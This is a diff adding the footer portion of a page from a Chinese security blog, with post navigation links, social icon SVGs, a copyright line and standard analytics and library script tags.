+          <a href="https://lcx.cc/tags/%E4%B8%AD%E5%9B%BD/">中国</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/3773/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">山西破获首起“伪基站”案件</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/3771/">
+            <span class="next-text nav-default">物理设备安全大牛 Barnaby Jack 挂了...</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M664.781909 681.472759 0 97.881301C0 3.997201 71.046997 0 71.046997 0L474.477909 0 961.649408 0 1361.641813 0C1361.641813 0 1432.688811 3.997201 1432.688811 97.881301L771.345323 681.472759C771.345323 681.472759 764.482731 685.154773 753.594283 688.65053L753.594283 688.664858C741.602731 693.493018 729.424896 695.068979 718.077952 694.839748 706.731093 695.068979 694.553173 693.493018 682.561621 688.664858L682.561621 688.65053C671.644501 685.140446 664.781909 681.472759 664.781909 681.472759L664.781909 681.472759ZM718.063616 811.603883C693.779541 811.016482 658.879232 802.205449 619.10784 767.734955 542.989056 701.759633 0 212.052267 0 212.052267L0 942.809523C0 942.809523 0 1024 83.726336 1024L682.532949 1024 753.579947 1024 1348.948139 1024C1432.688811 1024 1432.688811 942.809523 1432.688811 942.809523L1432.688811 212.052267C1432.688811 212.052267 893.138176 701.759633 817.019477 767.734955 777.248 802.205449 742.347691 811.03081 718.063616 811.603883L718.063616 811.603883Z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="linkedin"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="33" height="33">
+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
